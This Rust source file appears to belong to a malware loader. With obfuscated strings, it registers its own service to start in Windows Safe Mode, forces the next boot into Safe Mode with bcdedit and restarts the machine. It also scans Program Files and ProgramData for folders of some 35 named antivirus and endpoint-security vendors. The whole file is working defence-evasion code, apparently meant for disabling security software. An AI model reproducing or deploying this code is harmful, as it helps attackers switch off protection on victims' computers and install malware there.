use std::{ env, path::PathBuf };
use anyhow::{ Context, Result };
use loader_vars::constants::loader_service_name;
use obfstr::obfstr as s;
use shared::utils::functions::{ restart_pc_instant, spawn_program };

pub fn is_safe_mode() -> bool {
    match env::var(s!("SAFEBOOT_OPTION")) {
        Ok(val) => { val == s!("MINIMAL") || val == s!("NETWORK") }
        Err(_error) => { false }
    }
}

pub fn safemode_fail_safe() {
    rollback_safemode_and_restart()
}

pub fn rollback_safemode_and_restart() {
    if is_safe_mode() {
        match set_next_boot_normal() {
            Ok(_) => {}
            Err(_error) => {}
        }
        match restart_pc_instant() {
            Ok(_) => {}
            Err(_error) => {}
        }
    }
}

pub fn register_self_for_safemode() -> Result<()> {
    spawn_program(
        s!("REG"),
        Some(
            &format!(
                "{}{}{}",
                s!(r#"ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\"#),
                loader_service_name(),
                s!(r#"" /f"#)
            )
        )
    )?;
    Ok(())
}

pub fn register_seclogon_for_safemode() -> Result<()> {
    spawn_program(
        s!("REG"),
        Some(s!(r#"ADD "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\seclogon" /f"#))
    )?;
    Ok(())
}

pub fn set_next_boot_safemode() -> Result<()> {
    spawn_program(s!("bcdedit"), Some(s!(r#"/set {current} safeboot Minimal"#)))?;
    Ok(())
}

pub fn set_next_boot_normal() -> Result<()> {
    spawn_program(s!("bcdedit"), Some(s!("/deletevalue safeboot")))?;
    Ok(())
}

pub fn search_antivirus_directories(
    program_files_path: PathBuf,
    program_files_86_path: PathBuf,
    program_data_path: PathBuf
) -> Result<Vec<String>> {
    let antivirus_keywords: Vec<String> = vec![
        s!("ad-aware").to_string(),
        s!("adaware").to_string(),
        s!("antivirus").to_string(),
        s!("avast").to_string(),
        s!("avira").to_string(),
        s!("bitdefender").to_string(),
        s!("bullguard").to_string(),
        s!("clamav").to_string(),
        s!("clamwin").to_string(),
        s!("comodo").to_string(),
        s!("crowdstrike").to_string(),
        s!("drweb").to_string(),
        s!("emsisoft").to_string(),
        s!("f-secure").to_string(),
        s!("fortinet").to_string(),
        s!("hitmanpro").to_string(),
        s!("ikarus").to_string(),
        s!("immunet").to_string(),
        s!("kaspersky").to_string(),
        s!("kingsoft").to_string(),
        s!("lavasoft").to_string(),
        s!("malware").to_string(),
        s!("malwarebytes").to_string(),
        s!("mcafee").to_string(),
        s!("nod32").to_string(),
        s!("norton").to_string(),
        s!("panda security").to_string(),
        s!("safer-networking").to_string(),
        s!("sophos").to_string(),
        s!("spybot").to_string(),
        s!("spyware").to_string(),
        s!("symantec").to_string(),
        s!("trendmicro").to_string(),
        s!("webroot").to_string(),
        s!("windows defender").to_string()
    ];

    let mut antivirus_directories: Vec<String> = Vec::new();

    let paths = vec![program_files_path, program_files_86_path, program_data_path];

    for path in paths {
        let dir = std::fs::read_dir(path)?;

        for result in dir {
            let entry = result?;
            let path = entry.path();
            let file_name = match path.file_name() {
                Some(name) =>
                    name
                        .to_str()
                        .context(s!("Failed to convert pathbuf to_str").to_owned())?
                        .to_lowercase(),
                None => {
                    continue;
                }
            };

            if entry.file_type()?.is_dir() {
                for keyword in &antivirus_keywords {
                    if file_name.contains(&keyword.to_lowercase()) {
                        antivirus_directories.push(
                            path
                                .to_str()
                                .context(s!("Failed to convert pathbuf to_str").to_owned())?
                                .to_string()
                        );
                    }
                }
            }
        }
    }

    Ok(antivirus_directories)
}
